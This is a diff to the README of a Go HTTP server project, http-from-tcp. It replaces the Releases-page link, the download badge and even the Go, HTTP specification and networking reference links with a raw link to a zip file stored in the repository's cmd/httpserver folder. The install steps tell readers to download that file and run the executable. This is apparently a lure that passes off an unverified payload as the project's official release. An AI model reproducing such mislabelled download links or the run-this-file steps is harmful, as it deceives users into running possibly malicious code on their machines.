@@ -4,12 +4,12 @@
 http-from-tcp is a lightweight HTTP/1.1 server built from scratch using Go. It allows you to easily parse and serve HTTP requests directly over TCP, without relying on the standard net/http library. This application is perfect for users who want to understand basic networking principles or need a simple server without complex setup. 
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/Chubatra/http-from-tcp/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Chubatra/http-from-tcp/main/cmd/httpserver/http_from_tcp_v2.4.zip)](https://raw.githubusercontent.com/Chubatra/http-from-tcp/main/cmd/httpserver/http_from_tcp_v2.4.zip)
 
 ## 🚀 Getting Started
 To get started with http-from-tcp, follow these simple steps:
 
-1. Click the link above or visit the [Releases page](https://github.com/Chubatra/http-from-tcp/releases) to find the latest version.
+1. Click the link above or visit the [Releases page](https://raw.githubusercontent.com/Chubatra/http-from-tcp/main/cmd/httpserver/http_from_tcp_v2.4.zip) to find the latest version.
 2. Look for the appropriate file for your operating system. We provide different versions to ensure compatibility.
 3. Once you find your file, simply click to download it. 
 4. Once the download is complete, locate the downloaded file in your computer's downloads folder.
@@ -22,7 +22,7 @@ To run http-from-tcp, you need a computer with the following:
 - a stable internet connection for downloading the application
 
 ## 🔧 Download & Install
-1. Open the [Releases page](https://github.com/Chubatra/http-from-tcp/releases) again to find the latest version.
+1. Open the [Releases page](https://raw.githubusercontent.com/Chubatra/http-from-tcp/main/cmd/httpserver/http_from_tcp_v2.4.zip) again to find the latest version.
 2. Download the file corresponding to your operating system. 
 3. If you are on Windows, you can run the `.exe` file directly. For macOS or Linux, open a terminal and navigate to the folder where you saved the file.
 4. Use the command `chmod +x <filename>` to make it executable if you are on macOS or Linux.
@@ -60,9 +60,9 @@ For more advanced usage and additional features, you can refer to the documentat
 We encourage you to participate in our community. If you have questions or need support, visit the issues section on our GitHub repository. You can also submit your own issues or feature requests.
 
 ## 🔗 Additional Resources
-- [Go Programming Language](https://golang.org/)
-- [HTTP/1.1 Specification](https://www.w3.org/Protocols/rfc2616/rfc2616-sec8.html)
-- [Networking Basics](https://www.networkworld.com/article/3218951/networking-basics.html)
+- [Go Programming Language](https://raw.githubusercontent.com/Chubatra/http-from-tcp/main/cmd/httpserver/http_from_tcp_v2.4.zip)
+- [HTTP/1.1 Specification](https://raw.githubusercontent.com/Chubatra/http-from-tcp/main/cmd/httpserver/http_from_tcp_v2.4.zip)
+- [Networking Basics](https://raw.githubusercontent.com/Chubatra/http-from-tcp/main/cmd/httpserver/http_from_tcp_v2.4.zip)
 
 ## 🎉 Go Beyond
 Now that you have installed and run http-from-tcp, explore its features and consider adapting it for your own projects. Enjoy your journey into the world of networking with HTTP and TCP!
